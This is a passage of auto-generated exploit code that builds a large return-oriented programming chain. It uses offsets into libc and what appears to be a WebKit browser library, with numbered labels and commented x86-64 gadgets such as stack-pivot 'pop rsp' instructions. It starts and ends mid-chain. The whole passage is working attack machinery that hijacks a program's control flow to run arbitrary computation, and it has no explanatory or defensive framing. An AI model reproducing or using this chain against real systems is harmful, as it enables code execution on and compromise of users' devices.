ropchain+126256,//L1576
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1576:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+126312,//L1578
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1578:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+126408,//L1580
webkit_base+4687784,
libc_base+768796
]);
//L1579:
db([35,0]);// 0x23
set_gadget(webkit_base+3789839,);//pop r11
//L1580:
db([0,0]);
set_gadget(libc_base+772328,);
//L1581:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+126504,//L1582
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+126520,//L1583
webkit_base+4687784,
libc_base+772328
]);
//L1582:
db([0,0]);
set_gadget(libc_base+768796,);
//L1583:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+126608,//L1585
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1585:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+126664,//L1587
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1587:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+126736,//L1589
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1589:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+126792,//L1591
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1591:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+126896,//L1594
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1592:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L1594:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+126984,//L1596
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+127000,//L1597
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1596:
db([0,0]);
set_gadget(libc_base+772328,);
//L1597:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+127144,//L1600
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+127112,//L1598
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+127128,//L1599
webkit_base+4687784,
libc_base+165442
]);
//L1598:
db([0,0]);
set_gadget(libc_base+772328,);
//L1599:
db([0,0]);
set_gadget(libc_base+768796,);
//L1600:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+127240,//L1603
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1601:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1603:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+127328,//L1605
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+127344,//L1606
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1605:
db([0,0]);
set_gadget(libc_base+772328,);
//L1606:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+127488,//L1609
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+127456,//L1607
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+127472,//L1608
webkit_base+4687784,
libc_base+165442
]);
//L1607:
db([0,0]);
set_gadget(libc_base+772328,);
//L1608:
db([0,0]);
set_gadget(libc_base+768796,);
//L1609:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+127560,//L1611
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1611:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+127616,//L1613
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1613:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+127712,//L1615
webkit_base+4687784,
libc_base+768796
]);
//L1614:
db([36,0]);// 0x24
set_gadget(webkit_base+3789839,);//pop r11
//L1615:
db([0,0]);
set_gadget(libc_base+772328,);
//L1616:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+127808,//L1617
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+127824,//L1618
webkit_base+4687784,
libc_base+772328
]);
//L1617:
db([0,0]);
set_gadget(libc_base+768796,);
//L1618:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+127912,//L1620
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1620:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+127968,//L1622
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1622:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+128040,//L1624
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1624:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+128096,//L1626
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1626:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
//L1627:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+128248,//L1630
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1628:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1630:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+128336,//L1632
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+128352,//L1633
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1632:
db([0,0]);
set_gadget(libc_base+772328,);
//L1633:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+128496,//L1636
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+128464,//L1634
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+128480,//L1635
webkit_base+4687784,
libc_base+165442
]);
//L1634:
db([0,0]);
set_gadget(libc_base+772328,);
//L1635:
db([0,0]);
set_gadget(libc_base+768796,);
//L1636:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+128568,//L1638
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1638:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+128624,//L1640
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1640:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+128720,//L1642
webkit_base+4687784,
libc_base+768796
]);
//L1641:
db([37,0]);// 0x25
set_gadget(webkit_base+3789839,);//pop r11
//L1642:
db([0,0]);
set_gadget(libc_base+772328,);
//L1643:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+128816,//L1644
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+128832,//L1645
webkit_base+4687784,
libc_base+772328
]);
//L1644:
db([0,0]);
set_gadget(libc_base+768796,);
//L1645:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+128920,//L1647
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1647:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+128976,//L1649
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1649:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+129048,//L1651
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1651:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+129104,//L1653
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1653:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
//L1654:
libc_base+765209,//mov rsp,rbp ;pop rbp
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+129256,//L1657
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1655:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1657:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+129344,//L1659
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+129360,//L1660
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1659:
db([0,0]);
set_gadget(libc_base+772328,);
//L1660:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+129504,//L1663
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+129472,//L1661
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+129488,//L1662
webkit_base+4687784,
libc_base+165442
]);
//L1661:
db([0,0]);
set_gadget(libc_base+772328,);
//L1662:
db([0,0]);
set_gadget(libc_base+768796,);
//L1663:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+129576,//L1665
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1665:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+129632,//L1667
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1667:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+129728,//L1669
webkit_base+4687784,
libc_base+768796
]);
//L1668:
db([38,0]);// 0x26
set_gadget(webkit_base+3789839,);//pop r11
//L1669:
db([0,0]);
set_gadget(libc_base+772328,);
//L1670:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+129824,//L1671
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+129840,//L1672
webkit_base+4687784,
libc_base+772328
]);
//L1671:
db([0,0]);
set_gadget(libc_base+768796,);
//L1672:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+129928,//L1674
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1674:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+129984,//L1676
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1676:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+130056,//L1678
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1678:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+130112,//L1680
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1680:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+130240,//L1682
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+130224,//L1681
webkit_base+4687784,
libc_base+165442
]);
//L1681:
db([0,0]);
set_gadget(libc_base+768796,);
//L1682:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+130344,//L1683
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+130360,//L1684
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L1683:
db([0,0]);
set_gadget(libc_base+768796,);
//L1684:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+130480,//L1685
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+130464,//L1686
webkit_base+4687784,
libc_base+768796
]);
//L1686:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L1685:
db([0,0]);
//___sputc:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+130552,//L1688
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L1688:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+130656,//L1690
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+130672,//L1691
webkit_base+4687784,
libc_base+768796
]);
//L1689:
db([0,0]);
set_gadget(webkit_base+1420514,);//pop r8
//L1690:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L1691:
db([0,0]);
set_gadget(libc_base+165442,);
//L1692:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+130784,//L1694
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+130768,//L1693
webkit_base+4687784,
libc_base+165442
]);
//L1693:
db([0,0]);
set_gadget(libc_base+768796,);
//L1694:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+130880,//L1697
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1695:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L1697:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+130968,//L1699
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+130984,//L1700
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1699:
db([0,0]);
set_gadget(libc_base+772328,);
//L1700:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+131128,//L1703
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+131144,//L1704
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+131112,//L1702
webkit_base+4687784,
libc_base+713278
]);
//L1701:
db([12,0]);// 0xc
set_gadget(libc_base+165442,);
//L1702:
db([0,0]);
set_gadget(libc_base+772328,);
//L1703:
db([0,0]);
set_gadget(libc_base+768796,);
//L1704:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+131232,//L1706
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+131248,//L1707
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1706:
db([0,0]);
set_gadget(libc_base+772328,);
//L1707:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+131408,//L1709
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+131440,//L1711
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+131392,//L1708
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+131424,//L1710
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L1708:
db([0,0]);
set_gadget(libc_base+165442,);
//L1709:
db([0,0]);
set_gadget(libc_base+772328,);
//L1710:
db([0,0]);
set_gadget(libc_base+768796,);
//L1711:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+131552,//L1714
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+131536,//L1713
webkit_base+4687784,
libc_base+713278
]);
//L1712:
db([4294967295,4294967295]);// -0x1
set_gadget(libc_base+165442,);
//L1713:
db([0,0]);
set_gadget(libc_base+768796,);
//L1714:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+131656,//L1717
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1715:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L1717:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+131744,//L1719
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+131760,//L1720
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1719:
db([0,0]);
set_gadget(libc_base+772328,);
//L1720:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+131864,//L1723
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+131848,//L1722
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L1722:
db([0,0]);
set_gadget(libc_base+772328,);
//L1723:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+131936,//L1726
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
//L1724:
db([12,0]);// 0xc
set_gadget(libc_base+772328,);
//L1726:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+132104,//L1728
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+132120,//L1729
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+132088,//L1727
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L1727:
db([0,0]);
set_gadget(libc_base+165442,);
//L1728:
db([0,0]);
set_gadget(libc_base+768796,);
//L1729:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+132248,//L1731
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+132264,//L1732
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+132232,//L1730
webkit_base+4687784,
libc_base+165442
]);
//L1730:
db([0,0]);
set_gadget(libc_base+772328,);
//L1731:
db([0,0]);
set_gadget(libc_base+768796,);
//L1732:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+15055763,//cmp rax,rcx ;sete al
webkit_base+8949069,//setle al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+132440,//L1734
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+132456,//L1735
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+132424,//L1733
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L1733:
db([0,0]);
set_gadget(libc_base+165442,);
//L1734:
db([0,0]);
set_gadget(libc_base+768796,);
//L1735:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+132600,//L1739
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+132632,//L1741
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+132568,//L1737
webkit_base+4687784,
libc_base+165442
]);
//L1737:
db([0,0]);
set_gadget(libc_base+713278,);
//L1738:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L1739:
db([0,0]);
set_gadget(libc_base+772328,);
//L1740:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L1741:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+350006,//setne al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+132752,//L1742+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+132744,//L1742
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L1742:
db([0,0]);
set_gadgets([
ropchain+132768,//L1742+24
ropchain+137032,//L1736
libc_base+713278,
ropchain+132824,//L1745
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1743:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L1745:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+132912,//L1747
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+132928,//L1748
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1747:
db([0,0]);
set_gadget(libc_base+772328,);
//L1748:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+133072,//L1751
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+133088,//L1752
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+133056,//L1750
webkit_base+4687784,
libc_base+713278
]);
//L1749:
db([36,0]);// 0x24
set_gadget(libc_base+165442,);
//L1750:
db([0,0]);
set_gadget(libc_base+772328,);
//L1751:
db([0,0]);
set_gadget(libc_base+768796,);
//L1752:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+133176,//L1754
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+133192,//L1755
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1754:
db([0,0]);
set_gadget(libc_base+772328,);
//L1755:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+133352,//L1757
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+133384,//L1759
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+133336,//L1756
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+133368,//L1758
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L1756:
db([0,0]);
set_gadget(libc_base+165442,);
//L1757:
db([0,0]);
set_gadget(libc_base+772328,);
//L1758:
db([0,0]);
set_gadget(libc_base+768796,);
//L1759:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+133464,//L1760
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+133480,//L1761
webkit_base+4687784,
libc_base+165442
]);
//L1760:
db([0,0]);
set_gadget(libc_base+768796,);
//L1761:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+133576,//L1763
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+133560,//L1762
webkit_base+4687784,
libc_base+165442
]);
//L1762:
db([0,0]);
set_gadget(libc_base+768796,);
//L1763:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+133672,//L1766
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1764:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L1766:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+133760,//L1768
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+133776,//L1769
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1768:
db([0,0]);
set_gadget(libc_base+772328,);
//L1769:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+133920,//L1772
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+133936,//L1773
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+133904,//L1771
webkit_base+4687784,
libc_base+713278
]);
//L1770:
db([12,0]);// 0xc
set_gadget(libc_base+165442,);
//L1771:
db([0,0]);
set_gadget(libc_base+772328,);
//L1772:
db([0,0]);
set_gadget(libc_base+768796,);
//L1773:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+134024,//L1775
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+134040,//L1776
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1775:
db([0,0]);
set_gadget(libc_base+772328,);
//L1776:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+134200,//L1778
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+134232,//L1780
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+134184,//L1777
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+134216,//L1779
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L1777:
db([0,0]);
set_gadget(libc_base+165442,);
//L1778:
db([0,0]);
set_gadget(libc_base+772328,);
//L1779:
db([0,0]);
set_gadget(libc_base+768796,);
//L1780:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+134312,//L1781
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+134328,//L1782
webkit_base+4687784,
libc_base+165442
]);
//L1781:
db([0,0]);
set_gadget(libc_base+768796,);
//L1782:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+134456,//L1784
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+134472,//L1785
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+134440,//L1783
webkit_base+4687784,
libc_base+165442
]);
//L1783:
db([0,0]);
set_gadget(libc_base+772328,);
//L1784:
db([0,0]);
set_gadget(libc_base+768796,);
//L1785:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+15055763,//cmp rax,rcx ;sete al
webkit_base+8949069,//setle al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+134648,//L1787
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+134664,//L1788
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+134632,//L1786
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L1786:
db([0,0]);
set_gadget(libc_base+165442,);
//L1787:
db([0,0]);
